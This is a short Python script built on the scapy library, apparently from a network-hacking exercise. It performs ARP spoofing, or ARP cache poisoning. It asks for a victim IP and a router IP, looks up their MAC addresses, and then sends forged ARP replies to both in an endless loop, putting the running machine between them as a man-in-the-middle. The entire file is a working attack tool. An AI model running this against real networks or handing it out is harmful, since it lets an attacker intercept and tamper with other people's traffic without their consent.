#!/usr/bin/env python
import time
import sys
import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answ[0][1].hwsrc

def arp_spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

victim_ip = input("Enter the victim IP: ")
router_ip = input("Enter the router IP: ")
sent_packets_count = 0
while True:
    sent_packets_count += 2
    arp_spoof(victim_ip, router_ip)
    arp_spoof(router_ip, victim_ip)
    print("[+] Packets sent: " + str(sent_packets_count), end="\r")
    sys.stdout.flush()
    time.sleep(1)
